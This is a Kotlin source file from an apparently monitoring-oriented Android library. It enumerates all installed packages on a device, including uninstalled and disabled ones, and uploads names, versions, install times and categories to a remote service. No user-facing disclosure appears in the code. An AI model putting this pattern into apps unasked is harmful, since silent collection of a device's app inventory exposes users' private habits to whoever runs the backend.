package com.hawkshaw.library.features.misc

import android.content.Context
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.os.Build
import androidx.annotation.RequiresApi
import com.hawkshaw.library.datalayer.Injector
import com.hawkshaw.library.datalayer.models.InstalledApp
import com.hawkshaw.library.datalayer.models.PushInstalledAppListRequest
import com.hawkshaw.library.datalayer.models.PushInstalledAppListResponse
import com.hawkshaw.library.datalayer.network.twirp.ApiResponse
import com.hawkshaw.library.logger.Logger
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import android.util.Log

private const val TAG = "InstalledAppListKt"

@RequiresApi(Build.VERSION_CODES.P)
private fun getInstalledAppList(context: Context): ArrayList<InstalledApp> {
    Log.d(TAG, "getInstalledAppList() called")
    val packageManager = context.packageManager
    // For Android 11+, we need to explicitly request QUERY_ALL_PACKAGES permission in manifest
    // and handle the case where we might not see all packages
    val flags = PackageManager.GET_META_DATA or 
               (PackageManager.MATCH_UNINSTALLED_PACKAGES) or
               (PackageManager.MATCH_DISABLED_COMPONENTS)
    
    val installedPackages = try {
        packageManager.getInstalledPackages(flags)
    } catch (e: Exception) {
        Log.e(TAG, "Error getting installed packages: ${e.message}")
        emptyList()
    }
    Log.d(TAG, "[DEBUG] Total packages retrieved from PackageManager: ${installedPackages.size}")
    val appList = ArrayList<InstalledApp>()

    for (packageInfo in installedPackages) {
        if (packageInfo != null) {
            val appName = packageInfo.applicationInfo.loadLabel(packageManager).toString()
            val packageName = packageInfo.packageName
            val versionName = packageInfo.versionName ?: ""
            Log.d(TAG, "[DEBUG] Processing package: $packageName, App Name: $appName, VersionName: $versionName")

            // Log debug info
            Log.d(TAG, "[DEBUG] For $packageName: SDK is ${Build.VERSION.SDK_INT} (>= P). Using packageInfo.longVersionCode.")
            // Use long version code directly to match InstalledApp class
            val versionCode = packageInfo.longVersionCode
            Log.d(TAG, "[DEBUG] For $packageName: Final versionCode = $versionCode")
            val firstInstallTime = packageInfo.firstInstallTime
            val applicationInfo = packageInfo.applicationInfo
            val isSystemApp = (applicationInfo.flags and (ApplicationInfo.FLAG_SYSTEM or ApplicationInfo.FLAG_UPDATED_SYSTEM_APP)) != 0
            val category = toCategory(applicationInfo.category)
            val isEnabled = packageInfo.applicationInfo.enabled
            Log.d(TAG, "[DEBUG] For $packageName: isSystemApp=$isSystemApp, category=$category, isEnabled=$isEnabled, firstInstallTime=$firstInstallTime")

            appList.add(
                InstalledApp(
                    appName,
                    packageName,
                    versionName,
                    versionCode,
                    firstInstallTime,
                    isSystemApp,
                    category,
                    isEnabled
                )
            )
        } else {
            Log.d(TAG, "[DEBUG] Encountered a null packageInfo in installedPackages list.")
        }
    }
    Log.d(TAG, "getInstalledAppList() returned ${appList.size} apps")
    return appList
}

@RequiresApi(Build.VERSION_CODES.P)
suspend fun pushInstalledAppList(context: Context): ApiResponse<PushInstalledAppListResponse> = withContext(Dispatchers.IO) {
    Log.d(TAG, "pushInstalledAppList() called")
    try {
        Log.d(TAG, "[DEBUG] Attempting to get installed app list within pushInstalledAppList.")
        val appList = getInstalledAppList(context)
        val request = PushInstalledAppListRequest(appList)
        Log.d(TAG, "[DEBUG] Constructed PushInstalledAppListRequest: $request") // Relies on PushInstalledAppListRequest.toString()
        Log.d(TAG, "Pushing ${appList.size} installed apps")
        Log.d(TAG, "[DEBUG] Calling Injector.INSTANCE.miscService.pushInstalledAppList...")
        val response = Injector.INSTANCE.miscService.pushInstalledAppList(request)

        Logger.d( // This is existing Logger, will keep it
            TAG,
            "PushInstalledAppList: ${response.state}",
            false,
            4,
            null
        )
        Log.d(TAG, "pushInstalledAppList() completed. Response state: ${response.state}")
        response
    } catch (e: Exception) {
        Log.e(TAG, "Error in pushInstalledAppList()", e)
        Logger.e(TAG, "Error pushing installed app list", e, false, 12, null)
        throw e
    }
}

private fun toCategory(category: Int): InstalledApp.Category {
    Log.d(TAG, "toCategory() called with category: $category")
    val result = when (category) {
        -1 -> InstalledApp.Category.UNDEFINED
        ApplicationInfo.CATEGORY_GAME -> InstalledApp.Category.GAME
        ApplicationInfo.CATEGORY_AUDIO -> InstalledApp.Category.AUDIO
        ApplicationInfo.CATEGORY_VIDEO -> InstalledApp.Category.VIDEO
        ApplicationInfo.CATEGORY_IMAGE -> InstalledApp.Category.IMAGE
        ApplicationInfo.CATEGORY_SOCIAL -> InstalledApp.Category.SOCIAL
        ApplicationInfo.CATEGORY_NEWS -> InstalledApp.Category.NEWS
        ApplicationInfo.CATEGORY_MAPS -> InstalledApp.Category.MAPS
        ApplicationInfo.CATEGORY_PRODUCTIVITY -> InstalledApp.Category.PRODUCTIVITY
        ApplicationInfo.CATEGORY_ACCESSIBILITY -> InstalledApp.Category.ACCESSIBILITY
        else -> {
            Log.d(TAG, "[DEBUG] Category $category is unmapped, defaulting to UNDEFINED.")
            InstalledApp.Category.UNDEFINED
        }
    }
    Log.d(TAG, "toCategory() mapping $category to $result")
    return result
}

